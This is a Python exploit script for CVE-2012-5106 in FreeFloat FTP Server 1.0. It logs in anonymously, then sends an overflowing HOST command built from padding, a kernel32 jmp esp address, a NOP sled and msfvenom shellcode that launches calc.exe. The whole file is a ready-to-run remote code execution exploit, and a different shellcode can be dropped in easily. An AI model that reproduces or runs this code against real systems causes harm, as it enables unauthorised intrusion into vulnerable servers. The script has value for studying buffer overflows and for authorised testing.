#!/usr/bin/python

# Title: FreeFloatFTP 1.0 - CVE-2012-5106
# Exploit Author: lem0nSec
# Version: 1.0
# Tested on: Windows XP SP3


import socket
import os
import sys
from time import sleep

shellcode = "\xb8\x3e\x07\x1a\x27\xdb\xda\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
shellcode += "\x31\x31\x43\x13\x83\xc3\x04\x03\x43\x31\xe5\xef\xdb\xa5\x6b"
shellcode += "\x0f\x24\x35\x0c\x99\xc1\x04\x0c\xfd\x82\x36\xbc\x75\xc6\xba"
shellcode += "\x37\xdb\xf3\x49\x35\xf4\xf4\xfa\xf0\x22\x3a\xfb\xa9\x17\x5d"
shellcode += "\x7f\xb0\x4b\xbd\xbe\x7b\x9e\xbc\x87\x66\x53\xec\x50\xec\xc6"
shellcode += "\x01\xd5\xb8\xda\xaa\xa5\x2d\x5b\x4e\x7d\x4f\x4a\xc1\xf6\x16"
shellcode += "\x4c\xe3\xdb\x22\xc5\xfb\x38\x0e\x9f\x70\x8a\xe4\x1e\x51\xc3"
shellcode += "\x05\x8c\x9c\xec\xf7\xcc\xd9\xca\xe7\xba\x13\x29\x95\xbc\xe7"
shellcode += "\x50\x41\x48\xfc\xf2\x02\xea\xd8\x03\xc6\x6d\xaa\x0f\xa3\xfa"
shellcode += "\xf4\x13\x32\x2e\x8f\x2f\xbf\xd1\x40\xa6\xfb\xf5\x44\xe3\x58"
shellcode += "\x97\xdd\x49\x0e\xa8\x3e\x32\xef\x0c\x34\xde\xe4\x3c\x17\xb4"
shellcode += "\xfb\xb3\x2d\xfa\xfc\xcb\x2d\xaa\x94\xfa\xa6\x25\xe2\x02\x6d"
shellcode += "\x02\x1c\x49\x2c\x22\xb5\x14\xa4\x77\xd8\xa6\x12\xbb\xe5\x24"
shellcode += "\x97\x43\x12\x34\xd2\x46\x5e\xf2\x0e\x3a\xcf\x97\x30\xe9\xf0"
shellcode += "\xbd\x52\x6c\x63\x5d\xbb\x0b\x03\xc4\xc3"
# msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00\x0a\x0d" -f c
# badchars: \x00\x0a\x0d

payload = b"A"*247                   # offset at 247
payload += b"\x7b\x46\x86\x7c"       # 0x7C86467B (jmp esp kernel32.dll)
payload += "\x90"*20
payload += shellcode

try:
  
    print "[+] Triggering..."
    sleep(2)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('127.0.0.1',21))
    s.recv(1024)
    s.send('USER anonymous \r\n')
    s.recv(1024)
    s.send('PASS anonymous \r\n')
    s.recv(1024)
    s.send('HOST' + payload + '\r\n')    # sending HOST + buffer triggers the vulnerability
    s.close()
    print "[+] Exploitation completed."

except:
  
    print "[-] Connection error. Exiting..."
    sys.exit()
